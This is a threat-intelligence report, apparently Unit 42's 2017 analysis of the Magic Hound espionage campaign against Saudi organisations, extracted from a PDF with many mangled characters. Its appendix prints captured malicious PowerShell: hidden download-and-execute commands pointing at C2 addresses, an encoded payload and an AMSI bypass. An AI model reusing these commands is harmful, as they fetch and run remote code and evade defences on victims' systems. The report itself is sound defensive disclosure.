{
    "title": "Magic Hound Campaign Attacks Saudi Targets",
    "text": "01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 1 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/Magic Hound Campaign A!acks Saudi Targets147,969people reacted323 min. read This post is also available in: ೔ຊޠ( Japanese)Unit 42 has discovered a persistent a!ack campaign opera\"ng primarily in the Middle East da\"ng back to at leastmid-2016 which we have named Magic Hound. This appears to be an a!ack campaign focused on espionage.Based upon our visibility it has primarily targeted organiza\"ons in the energy, government, and technology sectorsthat are either based or have business interests in Saudi Arabia. The adversaries appear to have evolved theirtac\"cs and techniques throughout the tracked \"me-period, itera\"ng through a diverse toolset across diﬀerentwaves of a!acks. Link analysis of infrastructure and tools also revealed a poten\"al rela\"onship between MagicHound and the adversary group called “Rocket Ki!en” (AKA Opera\"on Saﬀron Rose, Ajax Security Team,Opera\"on Woolen-Goldﬁsh) as well as an older a!ack campaign called Newscasters. Ar\"facts of this campaignwas also recently published by Secureworks CTU.We were able to collect over ﬁ$y samples of the tools used by the Magic Hound campaign using the AutoFocusthreat intelligence tool. The earliest malware sample we were able to collect had a compile \"mestamp in May2016. The samples themselves ranged from IRC bots, an open source Python remote access tool, maliciousmacros, and others. It is believed the use of speciﬁc tools may have coincided with speciﬁc a!ack waves by thisadversary, with the most recent a!acks using weaponized Microso$ Oﬃce documents with malicious macros.Due to the large amount of data collected, and limita\"ons on a!ack telemetry, this blog will focus primarily on themost recent a!acks occurring in the la!er half of 2016.By Bryan Lee and Robert FalconeFebruary 15, 2017 at 9:16 PMCategory: Unit 42Tags: magic hound, Saudi ArabiaSHARE  Under Attack?About Unit 42ServicesUnit 42 Threat ResearchPartnersResources01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 2 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ATTACK DETAILSThe samples ini\"ally collected and associated with Magic Hound were Microso$ Word and Excel documentscontaining embedded malicious macros. We were able to expand our data set by pivo\"ng on infrastructure andtool behavior, which uncovered addi\"onal types of tools in use by Magic Hound, such as regular portableexecutable (PE) payloads, PE ﬁles compiled in .NET Framework, various forms of IRC bots, and an open source ﬁle-less Python remote access tool called Pupy.The weaponized Oﬃce documents were found to be hosted either on what appeared to be compromisedlegi\"mate websites, or on websites using domain names similar to legi\"mate domain names in appearance. Thetwo legi\"mate websites we were able to iden\"fy were owned by organiza\"ons in the government and energysectors. Based on the existence of these malicious ﬁles on the legi\"mate websites, it is highly probable that thewebsites had already been compromised in some fashion. At the \"me of inves\"ga\"on, the ﬁles had already beenremoved from the websites. The two other delivery sites were ntg-sa[.]com, which may be trying to spoof a Saudibased informa\"on and communica\"on technology conglomerate and mol.com-ho[.]me, which may be trying tospoof the Ministry of Labor. A third delivery site was iden\"ﬁed at its.com-ho[.]me which may appear to be abenign domain.Several of these documents were also found on a seemingly unrelated, but benign-looking domain, brieﬂ[.]ink.It is highly likely the adversary then used spear-phishing a!acks containing links to these malicious documents as adelivery mechanism. We were ul\"mately able to iden\"fy mul\"ple organiza\"ons in the government, energy, andtechnology sectors targeted by Magic Hound.The weaponized documents themselves all contained malicious macros which were designed to call WindowsPowerShell to retrieve addi\"onal tools. A handful of lures with diﬀerent themes were used repeatedly withvaria\"ons throughout the eighteen collected documents. They ranged from documents masquerading as oﬃcialSaudi government forms to a holiday gree\"ngs card. The forms masquerading as oﬃcial government documentsspeciﬁcally used imagery from the Ministry of Health and the Ministry of Commerce claiming to be mandatoryforms that required macros to be enabled. Examples of the documents can be seen below: 01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 3 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ 01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 4 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ INFRASTRUCTUREAnalysis of the weaponized documents revealed some peculiari\"es right away. The majority of documents usedthe name “gerry knight” for the author ﬁeld in the document metadata, and the embedded macros largely useddirect IP connec\"ons to command and control (C2) servers rather than using domain names. These C2 servers alsoappeared to lack any rela\"onships to each other and were hosted on a variety of VPS providers. Two of the Worddocuments using the “gerry knight” author name however were found to be communica\"ng to C2 servers on twospeciﬁc domains, www1.chrome-up[.]date and www3.chrome-up[.]date. Using these domains as pivot points, wewere able to expand our data set. As seen below, the rela\"onal analysis proved to be quite frui&ul:01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 5 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ Figure 1 Overview of rela!onshipsWe rapidly discovered a diﬀerent set of tools communica\"ng to the exact same C2 servers as those two Worddocuments, in addi\"on to other tools communica\"ng to other subdomain varia\"ons of chrome-up[.]date as seenin the following graphic:01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 6 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ Figure 2 Command and control overlapsFrom there, we were able to map out a large infrastructure separa\"ng out into four categories of tools:downloaders, droppers, loaders, and payloads. What ini\"ally appeared as a disparate and segregated a!ackcampaign appeared very rapidly to be a persistent and prolonged a!ack campaign with very speciﬁc goals in mind.In total, we were able to collect over ﬁ$y diﬀerent samples via infrastructure reuse, behavioral matching, and thereuse of a speciﬁc ﬁle for maintaining persistence. These tools included Microso$ Oﬃce documents, portableexecutables (PE), .NET Framework PE ﬁles, Meterpreter, IRC bots, an open sourced Meterpreter module calledMagic Unicorn, and an open sourced Python RAT called Pupy.Interes\"ngly as we con\"nued to expand and pivot in our data set, one of the C2 IPs used by an IRC bot payloadfrom Magic Hound was found to be the same IP used to deliver a diﬀerent IRC bot called MPK.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 7 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ Figure 3 Rocket Ki\"en and Magic Hound infrastructure overlapThe MPK bot is not publicly available and had previously been a!ributed to an adversary group called “RocketKi!en” which has o$en been thought to be a state sponsored adversary opera\"ng in the Middle East region.Although the likelihood of two diﬀerent adversaries focused on espionage opera\"ng in the same geographicalregion using one speciﬁc IP and not being related somehow is fairly slim, due to limited telemetry, we lackaddi\"onal corrobora\"ng evidence of a conclusive rela\"onship.MAGIC HOUND TOOLSETThe Magic Hound a!acks did not rely on exploit code to compromise targeted systems, instead relying onexecutables and Microso$ Oﬃce documents, speciﬁcally Excel and Word documents containing malicious macros.During our analysis, we were able to determine the ul\"mate payload for several of these a!acks. One payload wasa Python based open source remote administra\"on tool (RAT) called Pupy. A second payload was an IRC bot wehave named MagicHound.Leash. We have also seen this group use the Magic Unicorn module to generate aPowerShell script to deliver a shellcode-based payload. While we have not been able to obtain a secondarypayload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliverMetasploit's Meterpreter as a poten\"al payload as well.We have categorized the custom tools in use by the Magic Hound campaign into ﬁve categories, withcorresponding names in Table 1. Addi\"onal details for these tools may be found in the appendix.TYPENAMEDropperMagicHound.DropItExecutable LoaderMagicHound.Fetch01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 8 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/Document LoaderMagicHound.RolloverDownloaderMagicHound.RetrieverIRC BotMagicHound.LeashTable 1  Types of MagicHound tools and their Corresponding NamesMAGICHOUND.ROLLOVERThe Magic Hound campaign used Word and Excel documents containing malicious macros as a delivery method,speciﬁcally a!emp\"ng to load either the Pupy RAT or meterpreter which we have called MagicHound.Rollover.The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload froma remote server. We discovered two diﬀerent techniques used in the PowerShell scripts, the ﬁrst being astraigh&orward execute command of a string retrieved from the remote server. The second technique appeared tobe from a tool called Magic Unicorn, an open source module for meterpreter. Speciﬁcally, we discovered code inthe PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcodeinjec\"on with na\"ve x86 shellcode”.MAGICHOUND.FETCHIn addi\"on to loading payloads using macros within delivery documents, we observed the Magic Hound campaignusing executables to load secondary payloads from a remote server. Both a custom developed loader, which wehave named MagicHound.Fetch, as well as the default loader that comes with Pupy were found to be in use. TheFetch loader allowed us to use a!ributes within the loader to uncover more tools used by this group, whichincluded a backdoor and an IRC bot.Fetch ﬁrst a!empts to create persistent access to the targeted host then retrieve a secondary payload from aremote server. To set up persistence, the loader writes a ﬁle to \"c:\\temp\\rr.exe\" and executes it with speciﬁccommand line arguments to create auto run registry keys. All Fetch samples drop the same exact executable to setup persistence.Many of the Fetch samples we analyzed a!empted to obfuscate their func\"onality by encryp\"ng their embeddedstrings using AES. However, they all used the same key \"agkrhfpdbvhdhrkj\". The loader's main goal was to run aPowerShell command to execute shellcode. We found the PowerShell command used by Fetch within the sourcecode of Magic Unicorn, which was also used in the Magic Hound delivery documents. The shellcode executed bythis PowerShell is the exact same as in the delivery documents, using code from Metasploit which can obtainaddi\"onal shellcode to execute using an HTTP request to the following URL:h!p:/ /www7.chrome-up[.]date/0m5EEWe were not able to retrieve the shellcode hosted at this URL. However, as alluded to above, we believe that thisadversary used the open source Magic Unicorn tool to load a shellcode-based payload which is likely to bemeterpreter.PUPY LOADERThe Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of pla&orms such as01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 9 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/Windows, macOS, Linux and Android. We have seen the Magic Hound campaign use both the 32-bit and 64-bitDLL loaders that come with Pupy to infect Windows systems. Analysis of their conﬁgura\"ons show that the C2servers used both fully-qualiﬁed domain names and IP addresses. Also, the conﬁgura\"ons show the use of the“obfs3” (The Threebfuscator) transport, which is an obfusca\"on method to hide the true TCP-basedcommunica\"ons protocol. The “obfs3” is used in the Tor project and the speciﬁcs of this transport can be found atthe Tor Project.MAGICHOUND.DROPITThe Magic Hound campaign was also discovered using a custom dropper tool, which we have namedMagicHound.DropIt. The DropIt Trojan we analyzed is an executable that builds another executable by decodingembedded blobs of base64 encoded data and concatena\"ng them together in the correct order. In all of theDropIt samples we collected, the dropper then saves the executable to the user’s %TEMP% folder and executesthe ﬁle.We have also seen Magic Hound using DropIt as a binder, speciﬁcally dropping a legi\"mate decoy executablealong with the malicious executable onto the target host. The legi\"mate decoy executable and the maliciousexecutable are then both executed, but with the malicious ﬁle running in the background and the decoy presentedto the user. These types of tac\"cs are generally used for evasion and to not trigger and suspicion from the vic\"m.In one example, the decoy executable was a legi\"mate Flash installer, therefore from the vic\"m’s perspec\"ve, theywould experience the expected behavior of a Flash installer.MAGICHOUND.RETRIEVERWe observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level, Retriever is a.NET downloader that retrieves secondary payloads using an embedded URL in its conﬁgura\"on as the C2.Retriever uses .NET web services and the SoapH!pClientProtocol class to communicate with its C2 server, whichgenerates HTTP requests resembling the example request in Figure 4. Figure 4 Retriever HTTP request sent to its C2 serverMAGICHOUND.LEASHThe Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash.We discovered this connec\"on when we observed a DropIt sample installing a backdoor Trojan that used IRC forits C2 communica\"ons.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 10 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also beconnected to the IRC server. All of its available commands (see Appendix), except for the VER command seen inFigure 5, must be issued by individuals in the IRC channel with nicknames that start with \"AS_\" or \"AF_\". Figure 5 Lecash bot responding to VER commandThere are a great deal of similari\"es between the IRC bot originally discussed in iSight's NEWSCASTERwhitepaper and LEASH. iSight's whitepaper provided details on an IRC bot, which some refer to as Parastoo basedon the password used to join the IRC channel, as seen in the following network traﬃc generated when a!emp\"ngto connect to the C2:Parastoo TrojanMagicHound.LeashUSER AS_ # # :desNICK t__982JOIN :#\"stani ParastooUSER AS_a # # :desNICK ConroyJOIN :#kalk Performing a binary diﬀ revealed a 67% similarity between the Leash and Parastoo samples. In addi\"on to sharingsigniﬁcant por\"ons of code, both of the IRC bots require an IRC user's nickname to start with either \"AF_\" or \"AS_\"to run commands on the system. Also, the two bots have similar responses to \"VER\" commands seen in Figure 6below, which diﬀer slightly from the responses seen generated by Leash.01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 11 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ Figure 6 Parastoo Trojan responding to commands in similar manner to LeashMPKBotWe also found a second IRC bot called MPK using the same IP for its C2 server that a Leash sample was hostedon. This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communica\"ons protocol, asdetailed in a  whitepaper by CheckPoint regarding a threat group called Rocket Ki!en. We believe this version ofthe MPK Trojan is based on the same code base, as both the IRC version and the one referenced in the whitepaper have considerable similari\"es from a behavior standpoint as well as direct code overlap.CONCLUSIONThe Magic Hound a!ack campaign is an ac\"ve and persistent espionage mo\"vated adversary opera\"ng in theMiddle East region. Organiza\"ons in the government, energy, and technology sectors have been targeted by thisadversary, speciﬁcally organiza\"ons based in or doing business in Saudi Arabia. The toolset used by the MagicHound campaign was an assortment of custom tools, as well as open sourced tools available to the general public.None of the tools we uncovered were found to be exploit-driven, and relied exclusively on social engineeringtac\"cs to compromise targets. While we did discover a poten\"al rela\"onship with the Rocket Ki!en adversarygroup, we cannot conﬁrm the extent of that rela\"onship at this \"me, although we will con\"nue to monitor theac\"vi\"es of Magic Hound.Palo Alto Networks customers are protected via the following:WildFire iden\"ﬁca\"on and detec\"on of malicious samplesCommand and control servers are classiﬁed as maliciousAutoFocus tags have been createdMagic HoundMagicHound DropItMagicHound FetchMagicHound Retriever01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 12 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/MagicHound RolloverMagicHound LeashMagicHound MPKBotPuPYRATINDICATORS OF COMPROMISEMagicHound.DropIt SHA256c21074f340665935e6afe2a972c8d1ab517954e2dd05cc73e5ﬀ0e8df587b99dea139a73f8ec75ea60dfa87027c7c3ef4ed61b45e1acb5d1650cc54e658984bada2abdc951e4b2272fea5c8989debd22e26350bab4b4219104bccec5b8a7ﬀ5a0d3ae682868cb3ﬀ069ec52e1ﬀc5ef765453fd78e47b6366d96aebb09afd8abf0ecc4388f0d84501499711681a64a74c5d95e0bb6a2174cbe3744bd5a456396860f4cd44371a180a99bc16526f54f8b051c420a3df334d05d569d0cdadac3d2b42b1186211633c2d47f3d815f0371ba234fee2ed0f26e487badc58e1ab810614beee6e7aa244335e161fdc05296ea100090c2114b4ﬀ2e782e3ee3e1f936fdf5e0e09c9860b293c4c9a2382a7392963adc54d6a23440abb9a2d89c50f8fd3053161f9087d89a2d036ea32741d5a006c6bb279d36ﬀ8d1acde63f2e354f8c502 MagicHound.Fetch PE SHA256b6c159cad5a867895fd41c103455cebd361fc32d047b573321280b1451bf151c6a7537f2cedbf453114c'a086e4746e698713777'4fa4fc8964247dde741ed16d87'd8667677da1af5433b6d797438f8dc0ab565'40ecb29f83f148888cd92bc7d04445cf67aa7ddf15792cd62778d2d774d06616d1986f4c389b3d463f586d3409c908f667dd298b6a7e1e17652bb29af73e7daed4a5e945'df742e9f401/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 13 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/c3a8f5176351e87d28f45e58c79bb6646bb5d94ade7a24c6556514c860004143a390365ddfcce146a8fa8435022f19b9a1be29f2b11a049cb660ec53f36beb06d2ﬀc757a12817e4b58b3d58d71da951b177dedd3f65ca41fad04a03fc63fac679c9894b50cde62b182bd1560060c5c2bf5a1cef2b8afdﬀc4766e8c55ﬀ69322f7f3582504'ce349a6991'b3b5f9577c5c014b6ce889b80d51977fa6'31a8c2e4aa8d73ad2e48d70dfa18abea62769c7bef59c8c1607720f4f6162413f75abe8e86b787998a07411ee24f3f3d8a79e37c6da539650ceed566b081f968c269e4d2e983f8a807f741f8873e6fa5d222dc6f3b358ccfc3a6c700398b342f656e57f77cc3d117923ec01aa0e044edc11b1042e57993ca7f74d971630893ca263ca6e823dedd6ca5fada2b1fa63d0acb288027f5a3cdd2c60dcace3c424c5ced0eaaecabb439c81e522d9f5681fdb047ee62381e763f0d9646e68cd507479ba5a1c3e527e496c4b0594a403d6d582bc6db3029d27369720d0d5122f862b10d8f129a659'0ef0262e4de0dc3c6a140677b6ddee13c1819b791bd280be0547e309 MagicHound.Fetch PE C2service.chrome-up[.]datewww3.chrome-up[.]datewww7.chrome-up[.]date\"mezone[.]liveservice1.chrome-up[.]date104.238.184[.]252www5.chrome-up[.]date01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 14 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/servicesystem.serveirc[.]com MagicHound.Fetch DOC SHA256218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df671e584e7e1'3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ﬀ21d2073c56ea565d33ee8a57e142e752a9c8960c4f38b5d3ﬀ82bf17ec060e4114f5b15d22aa902e5469facc266d5582bd387d69032a91c8ﬀf373213b66a2f0852666e72bcdc1da528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf6266d24a529308d8ab7b27ddd43a6c2db84107b831257e'664044ec4437f9487bcfce4827106c79a81eef6d3a0618c90bf5f15936036873573db76bed7e8a086468db2b363a88b061cc9063535f3920673f1f08d985b14cb52b898ced6c0f8964e837f6b814c09900726dac2cf55f41babf361152875ba2a765a34ee5cc496087f912d40de9fe9a726448c1d84d'a2d4941f57210b2dbc035f5d34d68e8ac143af0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de96d1a50ca3e80442fa3e2caca86c166ed60bef32c2d0af7352cd227303cdec031 MagicHound.Fetch DOC C245.76.128[.]165139.59.46[.]154104.218.120[.]12801/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 15 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/89.107.62[.]3969.87.223[.]26analy\"cs-google[.]org89.107.60[.]11www3.chrome-up[.]datewww.microso$subsystem.com-adm[.]inwww1.chrome-up[.]date MagicHound.Fetch XLS SHA2566c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade MagicHound.Fetch XLS C245.76.128[.]165139.59.46[.]154 Pupy Loaders SHA2567e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73db453b8de1a01a3e4d963847c0a0a45'7e1a9b9e6d291c8883c74019f2fc91f82779504d3fa0ﬀc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 Pupy Loaders C201/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 16 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/139.59.46[.]154www1.chrome-up[.]date MagicHound.Retriever SHA2561c550dc73b7a39b0cd21d3de7e6c26ece156253ac96f032efc0e7fcc6bc872ce7cdbf5c035a64cb6c7ee8c204ad42b4a507b1fde5e6708ea2486942d0d358823b2ea3fcd2bc493a5ac86e47029b076716ed22ef4487f9090f4aa1923a48015d63f23972a0e80983351bedf6ad45ac8cd63669d3f1c76f8834c129a9e0418ﬀf1 MagicHound.Retriever C2service.chrome-up[.]datemsservice[.]sitemicroso$explorerservices[.]cloud MagicHound.Leash SHA256133959be8313a372f7a8d95762722a6ca02bc30aaﬀde0cbcf6ba402426d02f5ba3560d3c789984ca29d80f0a2ea38a224e776087e0f28104569630f870adaf4d8731a94d17e0740184910ec81ba703bad5ﬀ7afc92ba056f200533f668e07bf MagicHound.Leash C245.56.123[.]129syn.\"mezone[.]live01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 17 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/ MPKBot SHA256d08d737fa59edbea4568100cf83cﬀ7bf930087aaa640f1b4edf48eea4e07b19 MPKBot C245.58.37[.]142AppendixMAGICHOUND.ROLLOVERThe Magic Hound campaign used Word and Excel documents as a delivery method, speciﬁcally documents thatcontain a malicious macro that a!empts to load either the Pupy RAT or possibly Meterpreter. We call this toolMagicHound.Rollover. In one example, the Word document contained a bu!on with the label “First click \"EnableContent\" above the page, then click here to ﬁll out the form” This string a!empts to trick the user into enabling macros to execute the malicious code within the macro. Whenthe macro executes, it unhides a table that contains the contents of a legi\"mate document in an a!empt to makethe user less suspicious of the malicious ac\"vi\"es occurring in the background. The macro contains malicious codethat a!empts to download content from a remote server.The macro uses PowerShell to download a shellcode-based payload from a remote server using one of twoavailable techniques. The ﬁrst technique is rather straigh&orward, using PowerShell’s \"iex\" func\"on to execute astring obtained from a remote server. The macro carries out this ﬁrst technique by running the followingcommand:1powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46.154:3485/eiloShaegae1')\"01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 18 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/The code above generates the following HTTP request, which the C2 server would then respond to with a scriptthat PowerShell would execute:GET /eiloShaegae1 HTTP/1.1Host: 139.59.46[.]154:3485Connec\"on: Keep-AliveThe second method involves using PowerShell to create a thread to execute a buﬀer of shellcode, which webelieve the threat actors obtained from the Magic Unicorn source code. The Unicorn source code contains acomment for this speciﬁc PowerShell command, which is described as a “one line shellcode injec\"on with na\"vex86 shellcode”.The shellcode begins with a stub that is responsible for decryp\"ng addi\"onal shellcode. To decrypt the addi\"onalshellcode, the stub code will start with an ini\"al key, such as 0x6CAF9362 and XOR the ﬁrst DWORD of theaddi\"onal shellcode. It will then add the resul\"ng DWORD to the key that the stub code will use to decrypt thesecond DWORD and so on. A$er we decrypted the addi\"onal shellcode, we determined that the func\"onalshellcode is part of the Metasploit Framework, speciﬁcally using the block_api.asm code to resolve API func\"onnames and the block_reverse_h!p.asm code to obtain addi\"onal shellcode to execute on the system. Theassembly code used to create the shellcode can be obtained from:h!ps:/ /github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asmh!ps:/ /github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_h!p.asmThe purpose of the shellcode is to obtain addi\"onal shellcode to execute using an HTTP request to the URL\"hxxp:/ /45.76.128[.]165:4443/0w0O6\". We are unsure of the shellcode hosted at this URL, but it is possible thataddi\"onal shellcode-based payloads like Meterpreter could have been served by this shellcode.Two Rollover delivery documents (SHA256:6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256:218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2) a!empted to communicate withthe URL hxxp:/ /139.59.46[.]154:3485/eiloShaegae1 to obtain addi\"onal code to execute. On January 1, 2017, weobserved this URL responding to the above HTTP request with the following data:As you can see, the C2 server responds with a PowerShell command that will run on the system. The PowerShellcommand decodes to the following:1powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..1 2345$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')         {                        $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -n01/04/24, 21:07Magic Hound Campaign Attacks Saudi Targets Pagina 19 di 31https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/The script above checks the system architecture to determine if it is an x64 machine and a!empts to execute abase64 encoded command that decodes to the following:This decoded PowerShell script a!empts to download and execute a ﬁle using HTTP from the URL \"hxxp:/ /139.59.46[.]154:3485 /IMo8oosieVai\". The C2 server will respond to this HTTP GET request with a large amountof data that includes a PowerShell script that also contains a DLL payload that is embedded as a series of base64encoded chunks, that is then decoded using the following code: The PowerShell script loads the DLL payload directly into memory without saving it to the disk. The Pupy payloadwas generated using the following conﬁgura\"on, which shows the C2 IP/port and the use of the \"obfs3\" transport:It appears the adversary used a majority of the following Pupy module to create the PowerShell commands used inthe delivery documents:h!ps:/ /github.com/n1nj4sec/Pupy/blob/master/Pupy/Pupylib/payloads/ps1_oneliner.pyMAGICHOUND.FETCHThe custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for se(ng uppersistent access to the system and to reach out to a remote server to download and execute a secondarypayload. To set up persistence, the loader creates a folder named \"c:\\temp\", sets its a!ributes to be a hidden andsystem folder to hide the folder from view in Windows Explorer. It then writes a ﬁle named \"rr.exe\" (SHA256:f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and executes itwith speciﬁc command line arguments. During our analysis, we observed one loader running “rr.exe” with thefollowing arguments:The \"rr.exe\" payload dropped to the system does nothing more than use the supplied command line arguments tocreate a registry key to execute the payload each \"me the system starts. In the example above, the \"spp.exe\"executable would be added to an auto-run registry key at:678910111213op -encoded ' + $command            IEX $exec        }        else        {            $exec = [System.Convert]::FromBase64String($command)            $exec = [Text.Encoding]::Unicode.GetString($exec)            IEX $exec        }12345[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};    try{     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)    }catch{}    IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai'); 1$PEBytesTotal = 